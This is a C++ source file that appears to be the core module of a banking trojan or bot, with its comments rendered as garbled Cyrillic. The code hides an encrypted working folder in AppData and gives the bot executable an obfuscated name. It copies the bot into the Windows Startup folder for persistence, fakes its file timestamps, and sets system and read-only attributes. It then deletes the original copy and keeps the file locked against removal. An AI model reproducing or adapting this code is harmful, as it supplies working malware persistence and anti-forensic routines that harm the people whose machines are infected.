//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "DbgRpt.h"

//---------------------------------------------------------------------------

//const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};


//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

// ������� ������� ����
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;


// ������������ ������ ������� ������������ �����
#define MAX_CRYPTED_EXE_NAME_SIZE 50

// ������������ ��� ��� ����� ����
char OriginalBotExeName[] = {'W', 't', 'J', 'o', 'e', 'B', 't', '.', 'e', 'x', 'e',  0};

// ����������� ��� ������������ ����� ����
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";

// ��� ����� ����
DWORD BotExeNameHash = 0;

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
char BOT_UID[128];



PCHAR BotGetWorkFolder()
{
	// ������� ���������� ������� ������� ���� (�������� ���)

	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// ���������� ��� �� ������ ��������� ������������ ������ �� ����
	const static char WorkPath[] = "WnsBMT";

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath, false);

	// �������� ���� � ���������� ������
	const char *Buf = (Name) ? Name : WorkPath;

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);


	// �������� ��� � ������� ���
/*	PCHAR UID = GenerateBotID();

    PCHAR Password = GetMainPassword(true);

    const static char IV[] = {'d', 'j', 't', 'm', 'f', 'p', 'H', 'k',  0};

	DWORD BufSize = StrCalcLength(UID);
	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);

	// ���������� ��������� ������� � ����������
	for (PCHAR S = B64; *S != 0; S++)
    {
		if (*S == '/')
			*S = 'z';  // ������������ ������
		else
		if (*S == '+')
			*S = 'v';  // ����� ����������� � ���������, �� ������� ����� :))
	}

	// �������� ������
	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
	if (MCopy > STR::Length(B64))
		MCopy = STR::Length(B64);

	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);

	// ���������� ������������� ������
	STR::Free(Password);
	STR::Free(UID);
	MemFree(Encrypted);
	STR::Free(B64);

	*/

	// ����������� ���
	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------

PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// ������� ���������� ������� ������� ����

	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, TRUE))
		return NULL;


	if (InSysPath)
	{
		// �������� ���� � ��������� �����
		PCHAR Tmp = STR::Scan(Path, ':');
		if (Tmp == NULL)
			return NULL;
        Tmp++;
		*Tmp = 0;
	}


	PCHAR WorkPath = BotGetWorkFolder(); // ����������� �� �������

	// ��������� �������� ����
	StrConcat(Path, "\\");
	StrConcat(Path, WorkPath);

	if (!DirExists(Path))
		pCreateDirectoryA(Path, NULL);

	StrConcat(Path, "\\");

	// ��������� ������������
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		StrConcat(Path, CryptDir);

        STR::Free(CryptDir);

		if (!DirExists(Path))
			pCreateDirectoryA(Path, NULL);
    }

	PCHAR Result = STR::New(2, Path, FileName);
    STR::Free(Path);
	return  Result;
}
//----------------------------------------------------------------------------


void BOT::Initialize()
{
	// ������� �������������� ���������� ��������� ����

	// �������������� ���
	InitializeAPI();

	// ������ ��� ������� �����
	GetWorkFolderHash();

	GenerateUid(BOT_UID);

	// �������� �������� ����� ��� ����������
	// �������� ������ � ������ ������, ��� ���� ��� ����������� �����������
	// ������ �� �������� ������������� ��������� VEH.
	//InitialializeGlogalExceptionLogger(TRUE);

	// �������������� ���������� �������������� ����������.
	DebugReportInit();
}

//----------------------------------------------------------------------------
PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  ������� ���������� ������� ���� ����
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  ������ ������� GetWorkPath.
	//  ������� �� ����� �� �� � ���, ��� �����
	//   �������� � ����� ���������� �����
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  ������� ���������� ��� ����� ������� �����
	BotGetWorkFolder();
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  ������� ���������� ��� ����� ����

	// ��� ������������� ���������� ��� ����
	if (STR::IsEmpty(CryptedBotExeName))
	{
		PCHAR Name = UIDCrypt::CryptFileName(OriginalBotExeName, false);

		STR::Copy(Name, CryptedBotExeName, 0, StrCalcLength(Name) + 1);

		STR::Free(Name);

		// ����������� ��� �����

		BotExeNameHash = CalcHash(CryptedBotExeName);
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  ������� ���������� ��� ��� ����� ����
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotFullExeName()
{
	//  ������� ���������� ������ ��� ����� ����

	PCHAR Path = STR::Alloc(MAX_PATH);

	// �������� ���� � ����� ������������
	pSHGetSpecialFolderPathA(NULL, Path, CSIDL_STARTUP, TRUE);

    PCHAR Name = STR::New(3, Path, "\\", GetBotExeName());

	STR::Free(Path);

    return Name;
}
//----------------------------------------------------------------------------

HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;

void BOT::Protect(PCHAR FileName)
{
	// ������� �������� ��� ���� �� ��������
	bool FreeName = STR::IsEmpty(FileName);

	if (FreeName)
		FileName = GetBotFullExeName();

	if (FileName == NULL)
    	return;

	// ��������� ����
	BotFileHandle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(FileName, NULL, PAGE_READONLY, 0, 0, NULL );
	}

	if (FreeName)
		STR::Free(FileName);
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// ������� ������� ������ � ��� ����� ����
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// ������� ��������� ���� � ������������

	if (!FileExistsA(FileName))
		return false;

	PCHAR BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile, false, 0))
	{
		STR::Free(BotFile);
		return 0;
    }

    // ������� ��������� ��������
	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_NORMAL);

	// �������� ����
	bool Result = (BOOL)pCopyFileA(FileName, BotFile, TRUE) == TRUE;

	// ������������� ���� �����
	SetFakeFileDateTime(BotFile);

	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// ������� �������� ����
	if (Result)
		pDeleteFileA(FileName);


	STR::Free(BotFile);

	return Result;
}


//----------------------------------------------------
//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
//----------------------------------------------------
string BOT::BotExeMD5()
{
	PCHAR FileName = BOT::GetBotFullExeName();

	string Result = CalcFileMD5Hash2(FileName);

	STR::Free(FileName);

	return Result;
}


